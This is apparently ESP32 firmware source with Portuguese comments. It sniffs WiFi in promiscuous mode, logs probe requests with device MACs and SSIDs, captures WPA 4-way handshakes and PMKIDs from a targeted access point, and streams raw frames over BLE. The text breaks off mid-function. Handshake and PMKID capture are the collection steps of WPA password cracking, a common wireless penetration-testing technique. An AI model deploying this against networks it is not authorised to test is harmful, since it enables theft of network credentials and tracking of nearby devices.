#include "sniff_wifi.h"
#include "tlv.h"
#include "transport_ble.h"

#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "sniff-wifi";

#define MAX_DEDUP_ENTRIES   256
#define MAX_SSID_LEN        32

// EAPOL TLV: header(16) + frame bytes (até MTU-4-16 = 227 bytes).
// Frames EAPOL típicos: 121–189 bytes. Pode truncar M3 (~189–250B com KEK).
#define EAPOL_FRAME_MAX     227
#define EAPOL_TLV_HDR       16

typedef struct {
    uint8_t mac[6];
    uint8_t ssid_len;
    char    ssid[MAX_SSID_LEN];
} dedup_entry_t;

typedef struct {
    uint8_t  ch_min;
    uint8_t  ch_max;
    uint16_t dwell_ms;
    uint16_t duration_sec;
} probe_ctx_t;

typedef struct {
    uint8_t  bssid[6];
    uint8_t  channel;
    uint16_t duration_sec;
} eapol_ctx_t;

static volatile sniff_mode_t s_mode = SNIFF_MODE_IDLE;
static volatile bool s_stop = false;
static TaskHandle_t s_task = NULL;
static uint8_t s_seq = 0;

// Estado promisc (probe)
static dedup_entry_t *s_dedup = NULL;
static volatile size_t s_dedup_count = 0;
static volatile uint32_t s_total_frames = 0;
static volatile uint8_t s_current_channel = 0;

// Estado promisc (eapol)
static volatile uint8_t s_eapol_target_bssid[6];
static volatile uint8_t s_eapol_count = 0;
static volatile uint8_t s_eapol_msg_mask = 0;

bool sniff_wifi_busy(void)
{
    return s_mode != SNIFF_MODE_IDLE;
}

sniff_mode_t sniff_wifi_mode(void)
{
    return s_mode;
}

esp_err_t sniff_wifi_init(void)
{
    ESP_LOGI(TAG, "ready");
    return ESP_OK;
}

// ----------------------------------------------------------------------
// Probe sniff
// ----------------------------------------------------------------------

static bool dedup_check_and_add(const uint8_t mac[6],
                                 const uint8_t *ssid, uint8_t ssid_len)
{
    for (size_t i = 0; i < s_dedup_count; i++) {
        if (memcmp(s_dedup[i].mac, mac, 6) == 0 &&
            s_dedup[i].ssid_len == ssid_len &&
            memcmp(s_dedup[i].ssid, ssid, ssid_len) == 0) {
            return false;
        }
    }
    if (s_dedup_count >= MAX_DEDUP_ENTRIES) return false;
    memcpy(s_dedup[s_dedup_count].mac, mac, 6);
    s_dedup[s_dedup_count].ssid_len = ssid_len;
    if (ssid_len) memcpy(s_dedup[s_dedup_count].ssid, ssid, ssid_len);
    s_dedup_count++;
    return true;
}

static void emit_probe(const uint8_t mac[6], int8_t rssi, uint8_t channel,
                       const uint8_t *ssid, uint8_t ssid_len)
{
    uint8_t payload[9 + MAX_SSID_LEN];
    memcpy(&payload[0], mac, 6);
    payload[6] = (uint8_t)rssi;
    payload[7] = channel;
    payload[8] = ssid_len;
    if (ssid_len) memcpy(&payload[9], ssid, ssid_len);

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_PROBE_REQ, s_seq++,
                           payload, 9 + ssid_len);
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void emit_probe_done(uint16_t unique, uint16_t total_frames,
                             uint32_t scan_ms, uint8_t status)
{
    uint8_t payload[9];
    payload[0] = (uint8_t)(unique >> 8);
    payload[1] = (uint8_t)(unique & 0xFF);
    payload[2] = (uint8_t)(total_frames >> 8);
    payload[3] = (uint8_t)(total_frames & 0xFF);
    payload[4] = (uint8_t)(scan_ms >> 24);
    payload[5] = (uint8_t)(scan_ms >> 16);
    payload[6] = (uint8_t)(scan_ms >> 8);
    payload[7] = (uint8_t)(scan_ms & 0xFF);
    payload[8] = status;

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_PROBE_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void promisc_cb_probe(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 4) return;
    if (payload[0] != 0x40) return; // probe request

    s_total_frames++;

    const uint8_t *src = &payload[10];
    const uint8_t *ies = &payload[24];
    uint16_t ies_len = len - 24 - 4;
    if (ies_len < 2) return;
    if (ies[0] != 0x00) return;
    uint8_t ssid_len = ies[1];
    if (ssid_len > MAX_SSID_LEN) ssid_len = MAX_SSID_LEN;
    if (2 + ssid_len > ies_len) return;
    const uint8_t *ssid = &ies[2];

    if (!dedup_check_and_add(src, ssid, ssid_len)) return;

    int8_t rssi = pkt->rx_ctrl.rssi;
    emit_probe(src, rssi, s_current_channel, ssid, ssid_len);
}

static void probe_task(void *arg)
{
    probe_ctx_t *ctx = (probe_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    s_dedup = calloc(MAX_DEDUP_ENTRIES, sizeof(dedup_entry_t));
    if (!s_dedup) {
        ESP_LOGE(TAG, "dedup alloc failed");
        emit_probe_done(0, 0, 0, 2);
        goto cleanup;
    }
    s_dedup_count = 0;
    s_total_frames = 0;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_probe_done(0, 0, 0, 2);
        goto cleanup_dedup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_probe);

    uint8_t ch = ctx->ch_min;
    while (!s_stop && esp_timer_get_time() < deadline_us) {
        s_current_channel = ch;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(ctx->dwell_ms));
        ch = (ch >= ctx->ch_max) ? ctx->ch_min : (ch + 1);
    }

    esp_wifi_set_promiscuous(false);

    uint8_t status = (s_dedup_count >= MAX_DEDUP_ENTRIES) ? 1 : 0;
    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_probe_done((uint16_t)s_dedup_count, (uint16_t)s_total_frames,
                    elapsed, status);
    ESP_LOGI(TAG, "probe_sniff done: %u unique / %u frames in %u ms",
             (unsigned)s_dedup_count, (unsigned)s_total_frames,
             (unsigned)elapsed);

cleanup_dedup:
    free(s_dedup);
    s_dedup = NULL;
cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_probe_start(uint8_t ch_min, uint8_t ch_max,
                                 uint16_t dwell_ms, uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (ch_min == 0 || ch_min > 13) return ESP_ERR_INVALID_ARG;
    if (ch_max == 0 || ch_max > 13) return ESP_ERR_INVALID_ARG;
    if (ch_max < ch_min) return ESP_ERR_INVALID_ARG;
    if (dwell_ms < 100)   dwell_ms = 100;
    if (dwell_ms > 5000)  dwell_ms = 5000;
    if (duration_sec == 0) duration_sec = 30;
    if (duration_sec > 300) duration_sec = 300;

    probe_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    ctx->ch_min = ch_min;
    ctx->ch_max = ch_max;
    ctx->dwell_ms = dwell_ms;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_PROBE;
    s_stop = false;
    if (xTaskCreate(probe_task, "probe_sniff", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "probe_sniff started: ch=%u..%u dwell=%ums duration=%us",
             ch_min, ch_max, (unsigned)dwell_ms, (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_probe_stop(void)
{
    if (s_mode != SNIFF_MODE_PROBE) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// EAPOL capture (WPA 4-way handshake)
// ----------------------------------------------------------------------

// Tenta classificar a mensagem (1..4) pelo Key Information do EAPOL-Key.
// `key_info` é o campo de 16 bits em network byte order (já swap).
//   bit 8  (0x0100) = MIC
//   bit 7  (0x0080) = ACK
//   bit 6  (0x0040) = Install
//   bit 9  (0x0200) = Secure
//
// Detecção:
//   M1: ACK && !MIC
//   M2: !ACK && MIC && !Secure && !Install
//   M3: ACK && MIC && Install
//   M4: !ACK && MIC && Secure && !Install
static uint8_t classify_eapol_msg(uint16_t key_info)
{
    bool ack     = (key_info & 0x0080) != 0;
    bool mic     = (key_info & 0x0100) != 0;
    bool install = (key_info & 0x0040) != 0;
    bool secure  = (key_info & 0x0200) != 0;

    if (ack && !mic) return 1;
    if (!ack && mic && !secure && !install) return 2;
    if (ack && mic && install) return 3;
    if (!ack && mic && secure && !install) return 4;
    return 0;
}

static void emit_eapol(const uint8_t bssid[6], const uint8_t sta[6],
                       uint8_t msg_index, uint8_t flags,
                       uint16_t orig_frame_len,
                       const uint8_t *frame, size_t emit_len)
{
    uint8_t payload[EAPOL_TLV_HDR + EAPOL_FRAME_MAX];
    memcpy(&payload[0], bssid, 6);
    memcpy(&payload[6], sta,   6);
    payload[12] = msg_index;
    payload[13] = flags;
    payload[14] = (uint8_t)(orig_frame_len >> 8);
    payload[15] = (uint8_t)(orig_frame_len & 0xFF);
    if (emit_len > EAPOL_FRAME_MAX) emit_len = EAPOL_FRAME_MAX;
    memcpy(&payload[EAPOL_TLV_HDR], frame, emit_len);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_WPA_EAPOL, s_seq++,
                           payload, EAPOL_TLV_HDR + emit_len);
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_capture_done(const uint8_t bssid[6], uint8_t frames_count,
                               uint8_t msg_mask, uint32_t elapsed_ms,
                               uint8_t status)
{
    uint8_t payload[13];
    memcpy(&payload[0], bssid, 6);
    payload[6] = frames_count;
    payload[7] = msg_mask;
    payload[8]  = (uint8_t)(elapsed_ms >> 24);
    payload[9]  = (uint8_t)(elapsed_ms >> 16);
    payload[10] = (uint8_t)(elapsed_ms >> 8);
    payload[11] = (uint8_t)(elapsed_ms & 0xFF);
    payload[12] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_WPA_CAPTURE_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void promisc_cb_eapol(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 8 + 4) return;

    // Type bits no FC byte 0: bits 2..3. Data type = 0b10 → mask 0x0C == 0x08.
    if ((p[0] & 0x0C) != 0x08) return;

    // Protected frame? skip — EAPOL é sempre cleartext.
    if (p[1] & 0x40) return;

    // Header size: 24 bytes basic, +2 se QoS data (subtype bit 7 do byte 0).
    bool qos = (p[0] & 0x80) != 0;
    uint16_t hdr_len = qos ? 26 : 24;
    if (len < hdr_len + 8 + 4) return;

    // FC byte 1 bits: ToDS=0x01, FromDS=0x02
    uint8_t ds = p[1] & 0x03;
    const uint8_t *bssid;
    const uint8_t *sta;
    uint8_t direction; // 0=to_AP, 1=from_AP
    switch (ds) {
    case 0x01: // ToDS=1 FromDS=0 → addr1=BSSID, addr2=SA(STA), addr3=DA
        bssid = &p[4]; sta = &p[10]; direction = 0;
        break;
    case 0x02: // ToDS=0 FromDS=1 → addr1=DA(STA), addr2=BSSID, addr3=SA
        bssid = &p[10]; sta = &p[4]; direction = 1;
        break;
    default:
        return; // ad-hoc / WDS — ignora
    }

    // Filtra pelo BSSID alvo
    if (memcmp(bssid, (const void *)s_eapol_target_bssid, 6) != 0) return;

    // LLC/SNAP + EtherType: AA AA 03 00 00 00 88 8E
    const uint8_t *llc = &p[hdr_len];
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) return;

    // EAPOL packet starts at hdr_len+8.
    // EAPOL header: version(1) + type(1) + length_be(2) = 4 bytes.
    // Type 0x03 = EAPOL-Key. Depois vem Key Information (2 bytes BE).
    if (len < hdr_len + 8 + 4 + 2 + 4) return; // sanity
    const uint8_t *eapol = &p[hdr_len + 8];
    if (eapol[1] != 0x03) return; // só interessa EAPOL-Key

    // Descriptor type (1 byte) + Key Information (2 bytes BE)
    uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
    uint8_t msg = classify_eapol_msg(key_info);

    // Marca o bit no msg_mask (bit0=M1, bit1=M2, ...)
    if (msg >= 1 && msg <= 4) {
        s_eapol_msg_mask |= (uint8_t)(1u << (msg - 1));
    }
    s_eapol_count++;

    // Tira FCS de 4 bytes do final pra emitir só o frame 802.11
    uint16_t orig_len = (len >= 4) ? (len - 4) : len;
    uint8_t flags = 0;
    size_t emit_len = orig_len;
    if (emit_len > EAPOL_FRAME_MAX) {
        emit_len = EAPOL_FRAME_MAX;
        flags |= 0x01; // truncated
    }

    uint8_t bssid_copy[6], sta_copy[6];
    memcpy(bssid_copy, bssid, 6);
    memcpy(sta_copy,   sta,   6);
    (void)direction;
    emit_eapol(bssid_copy, sta_copy, msg, flags, orig_len, p, emit_len);
}

static void eapol_task(void *arg)
{
    eapol_ctx_t *ctx = (eapol_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    memcpy((void *)s_eapol_target_bssid, ctx->bssid, 6);
    s_eapol_count = 0;
    s_eapol_msg_mask = 0;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_capture_done(ctx->bssid, 0, 0, 0, 2);
        goto cleanup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_eapol);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    // Loop: encerra ao receber os 4 frames OU quando deadline expirar
    while (!s_stop && esp_timer_get_time() < deadline_us) {
        if (s_eapol_msg_mask == 0x0F) break; // M1..M4 todos vistos
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);

    uint8_t status;
    if (s_eapol_msg_mask == 0x0F)      status = 0; // ok, 4-way completo
    else if (s_eapol_count > 0)        status = 1; // parcial
    else                                status = 1; // timeout sem nada
    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    emit_capture_done(ctx->bssid, s_eapol_count, s_eapol_msg_mask,
                      elapsed, status);
    ESP_LOGI(TAG, "wpa_capture done: %u frames, mask=0x%02x in %u ms",
             (unsigned)s_eapol_count, (unsigned)s_eapol_msg_mask,
             (unsigned)elapsed);

cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_eapol_start(const uint8_t bssid[6], uint8_t channel,
                                  uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (!bssid) return ESP_ERR_INVALID_ARG;
    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
    if (duration_sec == 0) duration_sec = 60;
    if (duration_sec > 600) duration_sec = 600;

    eapol_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    memcpy(ctx->bssid, bssid, 6);
    ctx->channel = channel;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_EAPOL;
    s_stop = false;
    if (xTaskCreate(eapol_task, "wpa_capture", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "wpa_capture started: bssid=%02x:%02x:%02x:%02x:%02x:%02x ch=%u for %us",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
             channel, (unsigned)duration_sec);
    return ESP_OK;
}

esp_err_t sniff_wifi_eapol_stop(void)
{
    if (s_mode != SNIFF_MODE_EAPOL) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// PMKID capture (extrai PMKID KDE do M1 sem precisar do 4-way completo)
// ----------------------------------------------------------------------

#define PMKID_LEN 16

// Estado promisc (pmkid)
static volatile uint8_t s_pmkid_count = 0;

// Procura PMKID KDE no Key Data field. Retorna ponteiro pros 16 bytes do
// PMKID se encontrar, NULL caso contrário.
//
// KDE format:  type(0xDD) | length | OUI(00:0F:AC) | datatype(0x04) | PMKID(16)
// length = 4 (OUI+datatype) + 16 (pmkid) = 20 = 0x14
static const uint8_t *find_pmkid_kde(const uint8_t *kd, uint16_t kd_len)
{
    uint16_t i = 0;
    while (i + 2 <= kd_len) {
        uint8_t  t   = kd[i];
        uint8_t  len = kd[i + 1];
        if ((uint16_t)i + 2 + len > kd_len) break;
        if (t == 0xDD && len >= 4 + PMKID_LEN) {
            const uint8_t *body = &kd[i + 2];
            if (body[0] == 0x00 && body[1] == 0x0F && body[2] == 0xAC &&
                body[3] == 0x04) {
                return &body[4]; // PMKID
            }
        }
        i = (uint16_t)(i + 2 + len);
    }
    return NULL;
}

static void emit_pmkid_found(const uint8_t bssid[6], const uint8_t sta[6],
                              const uint8_t pmkid[PMKID_LEN])
{
    uint8_t payload[6 + 6 + PMKID_LEN];
    memcpy(&payload[0],  bssid, 6);
    memcpy(&payload[6],  sta,   6);
    memcpy(&payload[12], pmkid, PMKID_LEN);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PMKID_FOUND, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void emit_pmkid_done(const uint8_t bssid[6], uint8_t count,
                             uint32_t elapsed_ms, uint8_t status)
{
    uint8_t payload[12];
    memcpy(&payload[0], bssid, 6);
    payload[6]  = count;
    payload[7]  = (uint8_t)(elapsed_ms >> 24);
    payload[8]  = (uint8_t)(elapsed_ms >> 16);
    payload[9]  = (uint8_t)(elapsed_ms >> 8);
    payload[10] = (uint8_t)(elapsed_ms & 0xFF);
    payload[11] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PMKID_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void promisc_cb_pmkid(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 24 + 8 + 4) return;

    if ((p[0] & 0x0C) != 0x08) return;      // Data type
    if (p[1] & 0x40) return;                // Protected? skip

    bool qos = (p[0] & 0x80) != 0;
    uint16_t hdr_len = qos ? 26 : 24;
    if (len < hdr_len + 8 + 4 + 95) return;

    uint8_t ds = p[1] & 0x03;
    const uint8_t *bssid;
    const uint8_t *sta;
    switch (ds) {
    case 0x01: bssid = &p[4];  sta = &p[10]; break;
    case 0x02: bssid = &p[10]; sta = &p[4];  break;
    default: return;
    }
    if (memcmp(bssid, (const void *)s_eapol_target_bssid, 6) != 0) return;

    const uint8_t *llc = &p[hdr_len];
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) return;

    const uint8_t *eapol = &p[hdr_len + 8];
    if (eapol[1] != 0x03) return; // EAPOL-Key

    // Filtra M1: ACK=1, MIC=0
    uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
    bool ack = (key_info & 0x0080) != 0;
    bool mic = (key_info & 0x0100) != 0;
    if (!(ack && !mic)) return;

    // EAPOL-Key body começa em eapol+1 (descriptor type) +
    //   key_info(2) + key_len(2) + replay(8) + nonce(32) + iv(16) +
    //   rsc(8) + reserved(8) + mic(16) = 92 bytes apos descriptor type
    // Total fixed before key_data: 1 + 2 + 2 + 8 + 32 + 16 + 8 + 8 + 16 = 93
    // E mais key_data_len(2 bytes BE) = 95
    if (len < (uint16_t)(hdr_len + 8 + 4 + 95 + 4)) return;

    uint16_t kd_len = ((uint16_t)eapol[97] << 8) | eapol[98];
    if (kd_len == 0 || kd_len > 512) return;

    // Bound check: o payload do EAPOL pode ter sido truncado pela rádio.
    uint16_t payload_remaining = (uint16_t)(len - (hdr_len + 8 + 4 + 95) - 4); // -FCS
    if (kd_len > payload_remaining) kd_len = payload_remaining;

    const uint8_t *kd = &eapol[99];
    const uint8_t *pmkid = find_pmkid_kde(kd, kd_len);
    if (!pmkid) return;

    s_pmkid_count++;
    uint8_t bssid_copy[6], sta_copy[6], pmkid_copy[PMKID_LEN];
    memcpy(bssid_copy, bssid, 6);
    memcpy(sta_copy,   sta,   6);
    memcpy(pmkid_copy, pmkid, PMKID_LEN);
    emit_pmkid_found(bssid_copy, sta_copy, pmkid_copy);
}

static void pmkid_task(void *arg)
{
    eapol_ctx_t *ctx = (eapol_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    memcpy((void *)s_eapol_target_bssid, ctx->bssid, 6);
    s_pmkid_count = 0;

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filter);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set_promiscuous rc=%s", esp_err_to_name(err));
        emit_pmkid_done(ctx->bssid, 0, 0, 2);
        goto cleanup;
    }
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb_pmkid);
    esp_wifi_set_channel(ctx->channel, WIFI_SECOND_CHAN_NONE);

    // Para por 1ª PMKID encontrada OU duração
    while (!s_stop && esp_timer_get_time() < deadline_us) {
        if (s_pmkid_count >= 1) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);

    uint32_t elapsed = (uint32_t)((esp_timer_get_time() - start_us) / 1000);
    uint8_t status = (s_pmkid_count > 0) ? 0 : 1;
    emit_pmkid_done(ctx->bssid, s_pmkid_count, elapsed, status);
    ESP_LOGI(TAG, "pmkid_capture done: %u found in %u ms",
             (unsigned)s_pmkid_count, (unsigned)elapsed);

cleanup:
    free(ctx);
    s_stop = false;
    s_task = NULL;
    s_mode = SNIFF_MODE_IDLE;
    vTaskDelete(NULL);
}

esp_err_t sniff_wifi_pmkid_start(const uint8_t bssid[6], uint8_t channel,
                                  uint16_t duration_sec)
{
    if (s_mode != SNIFF_MODE_IDLE) return ESP_ERR_INVALID_STATE;
    if (!bssid) return ESP_ERR_INVALID_ARG;
    if (channel == 0 || channel > 13) return ESP_ERR_INVALID_ARG;
    if (duration_sec == 0) duration_sec = 60;
    if (duration_sec > 600) duration_sec = 600;

    eapol_ctx_t *ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return ESP_ERR_NO_MEM;
    memcpy(ctx->bssid, bssid, 6);
    ctx->channel = channel;
    ctx->duration_sec = duration_sec;

    s_mode = SNIFF_MODE_PMKID;
    s_stop = false;
    if (xTaskCreate(pmkid_task, "pmkid_cap", 4096, ctx, 5, &s_task) != pdPASS) {
        free(ctx);
        s_mode = SNIFF_MODE_IDLE;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "pmkid_capture started: bssid=%02x:%02x:%02x:%02x:%02x:%02x ch=%u",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
    return ESP_OK;
}

esp_err_t sniff_wifi_pmkid_stop(void)
{
    if (s_mode != SNIFF_MODE_PMKID) return ESP_ERR_INVALID_STATE;
    s_stop = true;
    return ESP_OK;
}

// ----------------------------------------------------------------------
// PCAP streaming (sem storage local — direto pro app via TLV)
// ----------------------------------------------------------------------

#define PCAP_TLV_HDR        7   // ts(4) + orig_len(2) + flags(1)
#define PCAP_FRAME_MAX      (TLV_MAX_FRAME_SIZE - 4 - PCAP_TLV_HDR) // ~236
#define PCAP_RATE_LIMIT_US  5000  // 5ms = ~200 frames/s teóricos

typedef struct {
    uint8_t  channel;
    uint8_t  filter;
    bool     has_bssid;
    uint8_t  bssid[6];
    uint16_t duration_sec;
} pcap_ctx_t;

static volatile uint8_t  s_pcap_filter = 0;
static volatile bool     s_pcap_has_bssid = false;
static uint8_t           s_pcap_bssid[6];
static volatile uint16_t s_pcap_emitted = 0;
static volatile uint16_t s_pcap_dropped = 0;
static volatile int64_t  s_pcap_start_us = 0;
static volatile int64_t  s_pcap_last_emit_us = 0;

static void emit_pcap_done(uint16_t emitted, uint16_t dropped,
                            uint32_t elapsed_ms, uint8_t status)
{
    uint8_t payload[9];
    payload[0] = (uint8_t)(emitted >> 8);
    payload[1] = (uint8_t)(emitted & 0xFF);
    payload[2] = (uint8_t)(dropped >> 8);
    payload[3] = (uint8_t)(dropped & 0xFF);
    payload[4] = (uint8_t)(elapsed_ms >> 24);
    payload[5] = (uint8_t)(elapsed_ms >> 16);
    payload[6] = (uint8_t)(elapsed_ms >> 8);
    payload[7] = (uint8_t)(elapsed_ms & 0xFF);
    payload[8] = status;

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PCAP_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(out, (size_t)total);
}

static void promisc_cb_pcap(void *buf, wifi_promiscuous_pkt_type_t type)
{
    uint8_t mask = 0;
    switch (type) {
    case WIFI_PKT_MGMT: mask = SNIFF_PCAP_FILTER_MGMT; break;
    case WIFI_PKT_DATA: mask = SNIFF_PCAP_FILTER_DATA; break;
    case WIFI_PKT_CTRL: mask = SNIFF_PCAP_FILTER_CTRL; break;
    default: return;
    }
    if (!(s_pcap_filter & mask)) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 16) return; // RTS = 16 bytes (menor frame válido aqui)

    if (s_pcap_has_bssid) {
        bool match = false;
        if (len >= 22) {
            const uint8_t *t = (const uint8_t *)s_pcap_bssid;
            if (memcmp(&p[4],  t, 6) == 0 ||
                memcmp(&p[10], t, 6) == 0 ||
                memcmp(&p[16], t, 6) == 0) match = true;
        }
        if (!match) return;
    }

    int64_t now = esp_timer_get_time();
    if (now - s_pcap_last_emit_us < PCAP_RATE_LIMIT_US) {
        s_pcap_dropped++;
        return;
    }
    s_pcap_last_emit_us = now;

    uint16_t orig_len = (len >= 4) ? (len - 4) : len; // tira FCS
    uint16_t emit_len = orig_len;
    uint8_t flags = 0;
    if (emit_len > PCAP_FRAME_MAX) {
        emit_len = PCAP_FRAME_MAX;
        flags |= 0x01; // truncated
    }

    int64_t rel = now - s_pcap_start_us;
    if (rel < 0) rel = 0;
    uint32_t ts_us = (uint32_t)rel;

    uint8_t payload[PCAP_TLV_HDR + PCAP_FRAME_MAX];
    payload[0] = (uint8_t)(ts_us >> 24);
    payload[1] = (uint8_t)(ts_us >> 16);
    payload[2] = (uint8_t)(ts_us >> 8);
    payload[3] = (uint8_t)(ts_us & 0xFF);
    payload[4] = (uint8_t)(orig_len >> 8);
    payload[5] = (uint8_t)(orig_len & 0xFF);
    payload[6] = flags;
    memcpy(&payload[PCAP_TLV_HDR], p, emit_len);

    uint8_t out[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(out, sizeof(out),
                           TLV_MSG_PCAP_FRAME, s_seq++,
                           payload, PCAP_TLV_HDR + emit_len);
    if (total > 0) {
        transport_ble_send_stream(out, (size_t)total);
        s_pcap_emitted++;
    }
}

static void pcap_task(void *arg)
{
    pcap_ctx_t *ctx = (pcap_ctx_t *)arg;
    int64_t start_us = esp_timer_get_time();
    int64_t deadline_us = start_us + (int64_t)ctx->duration_sec * 1000000LL;

    s_pcap_filter   = ctx->filter;
    s_pcap_has_bssid = ctx->has_bssid;
    if (ctx->has_bssid) memcpy(s_pcap_bssid, ctx->bssid, 6);
    s_pcap_emitted = 0;
    s_pcap_dropped = 0;
    s_pcap_start_us = start_us;
    s_pcap_last_emit_us = 0;

    // Filtro do hardware: combina os tipos solicitados.
    uint32_t hw_mask = 0;
    if (ctx->filter & SNIFF_PCAP_FILTER_MGMT) hw_mask |= WIFI_PROMIS_FILTER_MASK_MGMT;
